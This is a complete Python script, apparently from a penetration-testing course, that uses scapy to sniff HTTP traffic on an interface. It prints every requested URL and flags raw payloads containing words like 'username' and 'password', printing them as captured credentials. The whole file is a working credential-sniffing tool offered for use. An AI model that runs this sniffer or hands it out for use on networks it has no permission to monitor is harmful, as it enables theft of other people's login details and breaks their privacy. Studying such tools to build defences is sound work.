#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)

def get_url(packet):
    return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "pwd"]
        for key in keywords:
            if key in str(load):
                return str(load)


def process_sniff_packet(packet):
    # Check if the packet has http layer
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_details = get_login_info(packet)
        if login_details:
            print("\n\n[+] Possible Username and Password " + login_details + "\n")


sniff("eth0")